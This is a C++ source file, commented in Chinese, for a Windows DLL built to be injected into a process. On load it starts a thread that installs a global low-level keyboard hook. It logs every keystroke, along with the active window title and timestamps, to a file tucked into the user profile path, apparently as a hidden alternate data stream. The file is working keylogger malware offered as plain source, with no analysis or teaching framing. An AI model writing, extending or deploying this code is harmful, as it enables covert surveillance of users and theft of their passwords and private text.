// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "IATHook.cpp"

int __stdcall test(int x,int y)
{
    return x + y;
}

/*
* 按键监听
Dll注入 -- 安装键盘钩子(SetWindowsHookEX)

*/

BOOL shiftPress = FALSE;
BOOL capsLockOn = 0;
CHAR szActiveWin[0x50] = { 0 };
HWND hActiveWin = NULL;
std::ofstream outputFile;
HANDLE hThread = NULL;
SYSTEMTIME localTime = { 0 };

DWORD WINAPI ThreadProc(LPVOID lpParamter);
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
        break;

    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



DWORD WINAPI ThreadProc(LPVOID lpParamter)
{
    // 获取用户文件夹
    CHAR szPath[MAX_PATH] = { 0 };
    CHAR szTimeFormat[0x50] = { 0 };
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, szPath);
    wsprintfA(szPath,"%s:%s",szPath,"keylog.txt");
    //MessageBoxA(0,szPath,0,0);
    
    // 打开输出文件
    outputFile.open(szPath, std::ios::app | std::ios::out);
    if (!outputFile.is_open())
    {
        MessageBox(0,TEXT("Open file fail."), TEXT("error"), 0);
        return 1;
    }
    GetLocalTime(&localTime);
    sprintf_s(szTimeFormat, "\n{%d.%d.%d %d:%d}\n%03d: ",
        localTime.wYear,
        localTime.wMonth,
        localTime.wDay,
        localTime.wHour,
        localTime.wMinute,
        localTime.wSecond);
    outputFile << szTimeFormat;
    outputFile.flush();

    // 设置键盘钩子
    HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
    if (hKeyboardHook == NULL)
    {
        // 失败处理
        MessageBox(0, TEXT("Set hook fail."), TEXT("error"),0);
        return 1;
    }

    // 消息循环
    MSG msg;
    while ((GetMessage(&msg, NULL, 0, 0) != 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // 卸载钩子
    if (!UnhookWindowsHookEx(hKeyboardHook))
    {
        MessageBox(0,TEXT("Uninstall dll fail."),0,0);
        return 1;
    }

    // 关闭输出文件
    outputFile.close();


    return 0;
}


LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    SYSTEMTIME curLocalTime = { 0 };
    CHAR szTimeFormat[0x50] = { 0 };
    CHAR szCurrActiveWin[0x50] = { 0 };
    HWND hCurrActiveWin = GetForegroundWindow();
    
    GetWindowTextA(hCurrActiveWin,szCurrActiveWin,0x50);
    if (hActiveWin!=hCurrActiveWin&&hCurrActiveWin)
    {
        hActiveWin = hCurrActiveWin;
        ZeroMemory(szActiveWin,0x50);
        sprintf_s(szActiveWin,"\n{***%s***}\n%03d: ",szCurrActiveWin,localTime.wSecond);
        outputFile << szActiveWin;
        outputFile.flush();
    }

    GetLocalTime(&curLocalTime);

    if ((localTime.wYear < curLocalTime.wYear) ||
        (localTime.wMonth < curLocalTime.wMonth) ||
        (localTime.wDay < curLocalTime.wDay) ||
        (localTime.wHour < curLocalTime.wHour) ||
        (localTime.wMinute + 10 <= curLocalTime.wMinute))
    {
        sprintf_s(szTimeFormat, "\n{%d.%d.%d %d:%d}\n%03d: ",
            curLocalTime.wYear,
            curLocalTime.wMonth,
            curLocalTime.wDay,
            curLocalTime.wHour,
            curLocalTime.wMinute,
            curLocalTime.wSecond);

        outputFile << szTimeFormat;
        outputFile.flush();
        CopyMemory(&localTime, &curLocalTime, sizeof(SYSTEMTIME));
    }

     // 10秒换行
    if (((curLocalTime.wMinute - localTime.wMinute)*60 + (curLocalTime.wSecond - localTime.wSecond)) >= 10)
    {
        localTime.wSecond += (curLocalTime.wMinute - localTime.wMinute) * 60 + (curLocalTime.wSecond - localTime.wSecond);
        sprintf_s(szTimeFormat,"\n%03d: ", localTime.wSecond);
        outputFile << szTimeFormat;
        outputFile.flush();
    }

    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        CHAR keyChar = 0;
        CHAR funcKeyChar[0x10] = { 0 };
        KBDLLHOOKSTRUCT* pKeyboardStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyboardStruct->vkCode;

        // 功能键: 回车、回退、删除
        switch (vkCode)
        {
        case VK_RETURN: 
            sprintf_s(funcKeyChar, "[%s]", "enter"); 
            outputFile << funcKeyChar;
            outputFile.flush();
            return CallNextHookEx(NULL, nCode, wParam, lParam);

        case VK_DELETE:
            sprintf_s(funcKeyChar, "[%s]", "del"); 
            outputFile << funcKeyChar;
            outputFile.flush();
            return CallNextHookEx(NULL, nCode, wParam, lParam);

        case VK_BACK:
            sprintf_s(funcKeyChar, "[%s]", "back"); 
            outputFile << funcKeyChar;
            outputFile.flush();
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        case VK_LWIN:
            sprintf_s(funcKeyChar, "[%s]", "win");
            outputFile << funcKeyChar;
            outputFile.flush();
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        case VK_RWIN:
            sprintf_s(funcKeyChar, "[%s]", "win");
            outputFile << funcKeyChar;
            outputFile.flush();
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        case VK_CONTROL:
            sprintf_s(funcKeyChar, "[%s]", "ctrl");
            outputFile << funcKeyChar;
            outputFile.flush();
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        case VK_TAB:
            sprintf_s(funcKeyChar, "[%s]", "tab");
            outputFile << funcKeyChar;
            outputFile.flush();
            return CallNextHookEx(NULL, nCode, wParam, lParam);

        }

        // caps是否锁定，最低位为 1，表示 按键开启且切换
        capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        // shift 的状态，最高位为 1，表示按下
        shiftPress = (GetKeyState(VK_SHIFT) & 0x8000) == 0x8000;
        // 获取键盘字符
        keyChar = MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
        if (keyChar == 0) return CallNextHookEx(NULL, nCode, wParam, lParam);
        keyChar = tolower(keyChar);

        // 记录按下的键盘字符到文件
        if (capsLockOn && shiftPress == FALSE)
        {
            keyChar = toupper(keyChar);

        }
        else if (capsLockOn && shiftPress == TRUE)
        {
            switch (vkCode)
            {
                // <>?:"{}|~_+ 
            case VK_OEM_COMMA:	keyChar = '<'; break;
            case VK_OEM_PERIOD:	keyChar = '>'; break;
            case VK_OEM_2:	keyChar = '?'; break;
            case VK_OEM_1:	keyChar = ':'; break;
            case VK_OEM_7:	keyChar = '"'; break;
            case VK_OEM_4:	keyChar = '{'; break;
            case VK_OEM_6:	keyChar = '}'; break;
            case VK_OEM_5:	keyChar = '|'; break;
            case VK_OEM_3:	keyChar = '~'; break;
            case VK_OEM_MINUS:	keyChar = '_'; break;
            case VK_OEM_PLUS:	keyChar = '+'; break;
                // !@#$%^&*()
            case 0x31:    keyChar = '!'; break;
            case 0x32:    keyChar = '@'; break;
            case 0x33:    keyChar = '#'; break;
            case 0x34:    keyChar = '$'; break;
            case 0x35:    keyChar = '%'; break;
            case 0x36:    keyChar = '^'; break;
            case 0x37:    keyChar = '&'; break;
            case 0x38:    keyChar = '*'; break;
            case 0x39:    keyChar = '('; break;
            case 0x30:    keyChar = ')'; break;
            default:
                keyChar;
            }

        }
        else if (shiftPress == TRUE)
        {
            switch (vkCode)
            {
                // <>?:"{}|~_+ 
            case VK_OEM_COMMA:	keyChar = '<'; break;
            case VK_OEM_PERIOD:	keyChar = '>'; break;
            case VK_OEM_2:	keyChar = '?'; break;
            case VK_OEM_1:	keyChar = ':'; break;
            case VK_OEM_7:	keyChar = '"'; break;
            case VK_OEM_4:	keyChar = '{'; break;
            case VK_OEM_6:	keyChar = '}'; break;
            case VK_OEM_5:	keyChar = '|'; break;
            case VK_OEM_3:	keyChar = '~'; break;
            case VK_OEM_MINUS:	keyChar = '_'; break;
            case VK_OEM_PLUS:	keyChar = '+'; break;
                // !@#$%^&*()
            case 0x31:    keyChar = '!'; break;
            case 0x32:    keyChar = '@'; break;
            case 0x33:    keyChar = '#'; break;
            case 0x34:    keyChar = '$'; break;
            case 0x35:    keyChar = '%'; break;
            case 0x36:    keyChar = '^'; break;
            case 0x37:    keyChar = '&'; break;
            case 0x38:    keyChar = '*'; break;
            case 0x39:    keyChar = '('; break;
            case 0x30:    keyChar = ')'; break;
            default:
                keyChar=toupper(keyChar);
            }
        }

        outputFile << keyChar;
        outputFile.flush();
        
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
